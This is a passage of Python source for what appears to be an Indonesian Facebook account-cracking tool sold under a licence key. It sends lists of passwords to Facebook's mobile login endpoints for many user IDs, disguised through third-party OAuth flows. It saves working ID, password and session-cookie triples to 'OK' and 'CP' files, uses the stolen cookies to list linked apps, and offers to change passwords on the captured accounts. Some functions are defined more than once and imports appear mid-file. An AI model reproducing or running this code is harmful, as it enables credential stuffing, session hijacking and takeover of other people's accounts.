			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login.php?skip_api_login=1&api_key=389729911382431&kid_directed_site=0&app_id=389729911382431&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.8%2Fdialog%2Foauth%3Fscope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DeyJhdXRvIjoiMSIsInZlciI6IjIiLCJmb3JtYXQiOiJyZWRpcmVjdCIsInNvdXJjZSI6ImVud2ViIiwidGFyZ2V0IjoiIiwiX2NzcmZUb2tlbiI6ImQwMmI4OTBiLTE0YWQtNDgxYi05NDU3LTkyNTgwMDc1NDdkYSIsInBvcHVwIjoiIiwiYXJlYUlkIjoiMiIsImZyb211aWQiOiIwIiwiYXBwSWQiOiI5MDAiLCJyZXR1cm5VcmwiOiJodHRwczovL20ud2Vibm92ZWwuY29tL2xvZ2luL2NhbGxiYWNrP3JlZGlyZWN0VXJsXHUwMDNkaHR0cHMlM0ElMkYlMkZtLndlYm5vdmVsLmNvbSUyRmJvb2slMkZsb2dpbl8xNzgyNjM0MTEwNjIzNDkwNSIsImF1dG9UaW1lIjoiMTUiLCJsb2dpbnRhYiI6IiJ9%26redirect_uri%3Dhttps%253A%252F%252Fptlogin.webnovel.com%252Flogin%252FfacebookCallback%26client_id%3D389729911382431%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0f411e30-6f22-4335-add8-f253eeb6c9de%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fptlogin.webnovel.com%2Flogin%2FfacebookCallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJhdXRvIjoiMSIsInZlciI6IjIiLCJmb3JtYXQiOiJyZWRpcmVjdCIsInNvdXJjZSI6ImVud2ViIiwidGFyZ2V0IjoiIiwiX2NzcmZUb2tlbiI6ImQwMmI4OTBiLTE0YWQtNDgxYi05NDU3LTkyNTgwMDc1NDdkYSIsInBvcHVwIjoiIiwiYXJlYUlkIjoiMiIsImZyb211aWQiOiIwIiwiYXBwSWQiOiI5MDAiLCJyZXR1cm5VcmwiOiJodHRwczovL20ud2Vibm92ZWwuY29tL2xvZ2luL2NhbGxiYWNrP3JlZGlyZWN0VXJsXHUwMDNkaHR0cHMlM0ElMkYlMkZtLndlYm5vdmVsLmNvbSUyRmJvb2slMkZsb2dpbl8xNzgyNjM0MTEwNjIzNDkwNSIsImF1dG9UaW1lIjoiMTUiLCJsb2dpbnRhYiI6IiJ9%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1


def iflik(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Mobile iflix [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ses = requests.Session()
	#ua = random.choice(ugen3)
	ua = random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'])
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=761503727275074&kid_directed_site=0&app_id=761503727275074&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fapp_id%3D761503727275074%26cbt%3D1683048777571%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2671e2ba3a68c%2526domain%253Dwww.iflix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.iflix.com%25252Ff31ae45f9488458%2526relation%253Dopener%26client_id%3D761503727275074%26display%3Dtouch%26domain%3Dwww.iflix.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.iflix.com%252Fid%26locale%3Den_US%26logger_id%3Df3f7a5fe632099c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3252e76e7a6784%2526domain%253Dwww.iflix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.iflix.com%25252Ff31ae45f9488458%2526relation%253Dopener%2526frame%253Df3676d4e5441034%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv3.3%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3252e76e7a6784%26domain%3Dwww.iflix.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.iflix.com%252Ff31ae45f9488458%26relation%3Dopener%26frame%3Df3676d4e5441034%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=761503727275074&kid_directed_site=0&app_id=761503727275074&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fapp_id%3D761503727275074%26cbt%3D1683048777571%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2671e2ba3a68c%2526domain%253Dwww.iflix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.iflix.com%25252Ff31ae45f9488458%2526relation%253Dopener%26client_id%3D761503727275074%26display%3Dtouch%26domain%3Dwww.iflix.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.iflix.com%252Fid%26locale%3Den_US%26logger_id%3Df3f7a5fe632099c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3252e76e7a6784%2526domain%253Dwww.iflix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.iflix.com%25252Ff31ae45f9488458%2526relation%253Dopener%2526frame%253Df3676d4e5441034%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv3.3%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3252e76e7a6784%26domain%3Dwww.iflix.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.iflix.com%252Ff31ae45f9488458%26relation%3Dopener%26frame%3Df3676d4e5441034%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login.php?skip_api_login=1&api_key=761503727275074&kid_directed_site=0&app_id=761503727275074&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fapp_id%3D761503727275074%26cbt%3D1683048777571%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2671e2ba3a68c%2526domain%253Dwww.iflix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.iflix.com%25252Ff31ae45f9488458%2526relation%253Dopener%26client_id%3D761503727275074%26display%3Dtouch%26domain%3Dwww.iflix.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.iflix.com%252Fid%26locale%3Den_US%26logger_id%3Df3f7a5fe632099c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3252e76e7a6784%2526domain%253Dwww.iflix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.iflix.com%25252Ff31ae45f9488458%2526relation%253Dopener%2526frame%253Df3676d4e5441034%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv3.3%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3252e76e7a6784%26domain%3Dwww.iflix.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.iflix.com%252Ff31ae45f9488458%26relation%3Dopener%26frame%3Df3676d4e5441034%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	

def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m                ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m                ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))
		
kentod = random.choice(["KHRHE-UKDM-UOFJR-LBRJ","MORHE-UUQDM-OOFJR-IBRJZ","LIMPL-XDZGC-NNVDR-NXGXK","LHEZL-RPKJG-IPPOR-YWXGV","JOJQR-GKFVW-VLYJT-UNITI","GSNEP-NTRCE-CTKYK-OIAGD","LTQVM-NRQSC-LVJCL-SVQTD","HCYUY-ADXUB-MPCVJ-DGNQE","JHSQH-YAYOT-WDWFU-FAYIV","MTIRZ-YXKRT-ZEYGN-UWJMK","LWGOO-ZPRNJ-FKDXT-YNBZB","GTSCS-MEXZL-YXMLX-NLUCT","KWQRM-ROFYY-YLBST-BKXAE","LISBX-TPVSB-WXKEV-XOMIB","JVFEN-WKCFP-XLLXV-GAKUS","LEHBK-GBLHK-NACGN-EEHUW","KAEPL-IBDPP-WQYGN-PMUSI","KVIZG-ILJVO-EKFYT-THGKZ"])
kentodd=random.choice([kentod])
crot=(kentodd)

def getkey():
    import json, requests
    try:
        openkey = open(".key.txt","r").read()
        files = openkey.split("\n")[1]
        key = openkey.split("\n")[0]
    except FileNotFoundError:
        os.system("clear")
        banner();time.sleep(1)
        print("[+] Status \033[32mNotlisensi\033[0m")
        prints(nel(f'{P2}License Anda Tidak Tersedia Jika Mau Beli Liat Dibawah{P2}',width=70,padding=(0,7),style=f"{color_panel}"));time.sleep(2)
        print('[+] List Harganya :')
        prints(nel(f'{P2}- Open source 500k\n- 1 minggu 25k\n- 2 minggu 50k\n- 3 minggu 75k\n- 1 bulan 125k\n- Permanen 250k enc Full Update{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
        prints(nel(f'{P2}License Anda : {H2}{crot}{P2}',title='[white]ISI NAMA ANDA TANPA PAKAI SPASI',width=70,padding=(0,7),style=f"{color_panel}"));time.sleep(1)
        namamu = input("\033[0m[+] Nama anda :\033[32m ")
        prints(nel(f'{P2}Note : kalau mau beli ketik "{H2}y{P2}" kalau gak mau ketik "{H2}t{P2}" {P2}',width=70,padding=(0,7),style=f"{color_panel}"))
        yt = input("[+] Beli Lisensi : \033[32m")
        if yt in ["Y","y"]:
            prints(nel(f'{P2}Keyname anda : {H2}{crot}{P2} - {H2}{namamu}{P2} tunggu sebentar akan diarahkan ke WhatsApp\nNote : {M2} Jika anda sudah di konfirmasi silahkan tunggu 5 menit, setelah 5 menit lalu jalankan ulang scriptnya terimakasih.{P2}',width=70,padding=(0,7),style=f"{color_panel}"));time.sleep(3);os.system("xdg-open https://wa.me/+6282152321183?text=Assalamualaikum+bang+Bosmuda,+aku+mau+beli+scriptnya+tapi+yang+versi+premium.+Ini+lisensinya:%20"+crot+"+konfitmasi+nama+pembeli:%20"+namamu)
            open(".key.txt","w").write(crot+"\n"+namamu);exit()
        else:
        	prints(nel(f'{P2}Lisensi telah keluar dari program{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
    try:
        confirmkey = requests.get("https://raw.githubusercontent.com/jadibosmuda/data-base/main/jadibos.json").json()
    except requests.exceptions.ConnectionError:
    	prints(nel(f'{P2}Jaringan Internet Kamu Tidak Ada{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
    if confirmkey[files] == key:
        if confirmkey[files] == "tidakada":
        	prints(nel(f'{P2}Lisensi key Kamu Sudah Kadaluarsa{P2}',width=70,padding=(0,7),style=f"{color_panel}"));os.system("rm .key.txt");exit()
        else:
        	prints(nel(f'{P2}Welcome{H2} premium,{P2} Lisensi key Kamu Sudah Aktif{P2}',width=70,padding=(0,7),style=f"{color_panel}"));time.sleep(1);login()
    else:
    	prints(nel(f'{P2}Lisensi key Kamu Sudah Kadaluarsa{P2}',width=70,padding=(0,7),style=f"{color_panel}"));os.system("rm .key.txt");exit()


# CEK APLIKASI YANG TERKAIT
def cek_apkk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":kuki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n [+] opshh tidak ada aplikasi aktif di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":kuki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n [+] opshh tidak ada aplikasi kadaluarsa di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

#------[BUAT CEK APK CRACK]-------#
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))
		
#-----[BUAT CEK APK OPSI]-----#
def cek_apk(coki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+coki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m                ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+coki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m                ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))
	
#-------[TAP YES V1]--------#
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til ="\033[0m╰─ "

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def file_cp():
	dirs = os.listdir('CP')
	prints(nel(f'{P2}Tools Facebook Checker Account checkpoint V¹\nPeringatan :{M2} Ini mungkin kebnyakn {H2}akun tidak, cekpoin {M2}dan tidak semua berganti sandi Terimakasih.{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	for file in dirs:
		print("➛ \033[0m%s"%(file));jeda(0.07)
	try:
		prints(nel(f'{P2}[+] Masukan file [ cth{M2}: {K2}CP-%s.txt{P2} ]'%(waktu),width=70,padding=(0,7),style=f"{color_panel}")) 
		opsi()
	except IOError:
		print ('%s[+]\033[0mfile tidak ada'%(M))
		exit()

def opsi():
	CP = ("CP/")
	romi = input("[+]%s \033[0mNama file %s> %s"%(O,M,K))
	if romi == "":
		print("[+]%s \033[0misi yang benar "%(M));jeda(2)
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n[+]%s \033[0mnama file %s\033[0m tidak tersedia"%(M,romi))
	jalan("\033[0m[+]%s\033[0m Mode pesawatkan terlebih dahulu 5 detik "%(O))
	pw=input("\n[+]%s \033[0mubah sandi pada akun one tab? y/t %s> %s"%(O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("\033[0m[+]%s \033[0mmasukan sandi %s> %s"%(O,M,K))
		if len(pw2) <= 5:
			print("[+] %ssandi minimal 6 karakter "%(M))
		else:
			pwbaru.append(pw2)
	prints(nel(f'{P2}Total akun : {H2}{str(len(file_cp))}{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		print("\n%s%s.%s \033[0mlogin akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
